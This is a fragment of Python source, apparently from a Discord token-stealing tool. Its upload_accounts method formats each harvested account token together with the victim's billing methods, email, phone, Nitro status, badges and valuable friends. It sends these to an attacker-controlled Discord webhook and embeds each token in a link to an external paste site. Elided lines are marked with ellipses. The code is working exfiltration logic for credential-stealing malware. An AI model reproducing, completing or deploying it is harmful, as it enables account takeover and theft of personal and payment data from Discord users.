...
class discord():
    ...
    def upload_accounts(self, webhook: str) -> None:
        ...
        for token in self.tokens:
            ...
            embed.add_field(name="<:bro:980498956142411866> Token:",
                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(
                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:pog:980652651236712459> Badges:",
                            value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<:paypal:980258301747023893> Billing:",
                            value=f"{methods if methods != '' else 'None'}", inline=True)
            embed.add_field(name="<:fancey:980258301361127464> Email:",
                            value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:evil:980654515508351026> Phone:",
            ...
            if hq_friends != "":
                embed.add_field(
                    name="<a:swag:980258302111916044> HQ Friends:", value=f"{hq_friends}", inline=False)
            embed.add_field(name="\u200b", value=f"\u200b",
                            inline=False) if hq_guilds or hq_friends != "" else None

            embed.set_footer(text="discord.gg/wojak")

            webhook.send(embed=embed, username="ClamEnjoyer",
